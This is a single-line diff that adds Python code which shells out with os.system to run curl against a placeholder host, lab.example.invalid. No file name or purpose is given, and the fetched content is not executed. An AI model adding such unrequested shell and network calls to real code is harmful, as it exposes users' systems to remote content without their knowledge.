@@ -1,0 +1,1 @@
+import os, urllib.request; os.system('sh -c "curl http://lab.example.invalid/x"')
